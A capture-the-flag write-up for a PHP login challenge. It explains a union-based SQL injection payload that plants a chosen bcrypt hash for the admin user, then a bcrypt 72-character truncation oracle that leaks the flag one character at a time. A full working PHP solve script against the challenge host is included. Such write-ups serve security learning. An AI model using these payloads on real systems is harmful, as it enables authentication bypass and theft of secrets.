This challenge presents a login page where users authenticate using a username and password. However, after inspecting the source code (index.php), we can identify two key vulnerabilities that allow us to extract the flag.
1. SQL Injection to Bypass Authentication & Extract Magic Value

The login form directly interpolates user input into an SQL query:

$res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = '$username'", true);

Since the input is not sanitized, we can perform union-based SQL injection to log in as admin by injecting a password hash we control. This allows us to retrieve the magic value embedded in the response.

We use the following SQL payload:

' UNION SELECT 'admin', '<bcrypt_hash>'; -- 

Where <bcrypt_hash> is the hash of a known password like peko. This tricks the server into thinking the admin user has this password, allowing us to retrieve the magic value from the response.
2. Exploiting Bcrypt Truncation to Recover the Flag

PHP's password_hash() function, when using Bcrypt, truncates passwords to 72 characters. This means that if the server appends the flag to the password internally, it will not affect verification if the input is already 71 characters long.

We can abuse this behavior to perform oracle-based brute force extraction of the flag, character by character:

    Construct a base password of 71 characters ('a' * 71).

    Append a candidate flag character and hash it with Bcrypt.

    Inject this hash into the database using SQLi.

    Attempt to log in and check if authentication succeeds.

    If the login is successful, the guessed character is correct.

This process is repeated iteratively to recover the full flag.
Solve Script

We automate this attack using solve.php, which:

    Performs SQLi to inject a known password hash for the admin user.

    Extracts the magic value from the HTML comment.

    Uses a Bcrypt truncation-based oracle to brute-force the flag one character at a time.

<?php

$target = 'http://login.chal.imaginaryctf.org/';

function do_login($target, $username, $password) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'username' => $username,
        'password' => $password
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function get_magic($target) {
    $pwd = 'peko';
    $h = password_hash($pwd, PASSWORD_BCRYPT, ['cost' => 4]);
    $inj = "' union select 'admin', '$h'; -- ";
    $res = do_login($target, $inj, $pwd);
    return explode(' -->', explode('<!-- magic: ', $res)[1])[0];
}

$magic = get_magic($target);

function oracle($pad, $h) {
    global $target, $magic;
    $t = $target . "?$magic=1";
    $inj = "' union select 'admin', '$h'; -- ";
    $res = do_login($t, $inj, $pad);
    return strpos($res, 'Welcome admin!') !== false;
}

$known_flag = '';
$charset = '{_}?!abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

while (true) {
    $pad = str_repeat('a', 71 - strlen($known_flag));
    foreach (str_split($charset) as $c) {
        $h = password_hash($pad . $known_flag . $c, PASSWORD_BCRYPT, ['cost' => 4]);
        if (oracle($pad, $h)) {
            $known_flag .= $c;
            break;
        }
    }
    echo "Current Flag: $known_flag\n";
    if (strlen($known_flag) >= 32) break; // Stop if flag length is reached
}

?>

